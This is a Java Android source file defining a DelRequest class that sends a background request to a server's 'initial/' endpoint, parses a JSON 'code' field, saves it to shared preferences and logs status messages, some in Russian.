package com.inet.android.request;

import org.json.JSONException;
import org.json.JSONObject;

import com.inet.android.bs.Caller;
import com.inet.android.utils.Logging;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.AsyncTask;
import android.preference.PreferenceManager;

public class DelRequest extends DefaultRequest {
	private final String LOG_TAG = "DelRequest";
	Context ctx;
	
	public DelRequest(Context ctx) {
		super(ctx);
		this.ctx = ctx;
	}

	@Override
	public void sendRequest(String request) {
		DelTask srt = new DelTask();
		srt.execute(request);
	}
	
	class DelTask extends AsyncTask<String, Void, Void> {
		@Override
		protected Void doInBackground(String... strs) {
			sendPostRequest(strs[0]);
			return null;
		}	
	}

	@Override
	protected void sendPostRequest(String request) {
		String str = Caller.doMake(request, "initial/");
		if (str != null) {
			getRequestData(str);
		} else {
			Logging.doLog(LOG_TAG, "ответа от сервера нет или статус ответа плох", 
					"ответа от сервера нет или статус ответа плох");
		}
	}

	@Override
	protected void getRequestData(String response) {
		Logging.doLog(LOG_TAG, "getResponseData: " + response, "getResponseData: " + response);

		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(ctx);
		Editor ed = sp.edit();
		
		JSONObject jsonObject = null;
		try {
			jsonObject = new JSONObject(response);
		} catch (JSONException e) {
			if (response == null) {
				Logging.doLog(LOG_TAG, "json null", "json null");
			}
			return;
		}
		
		String str = null;
		try {
			str = jsonObject.getString("code");
		} catch (JSONException e) {
			e.printStackTrace();
		}
		if (str != null) {
			ed.putString("code", str);
		} else {
			ed.putString("code", "code");
		}
		
		if (str.equals("1")) {
			Logging.doLog(LOG_TAG, "total annihilation", "total annihilation");
		}
		ed.commit();
	}

}
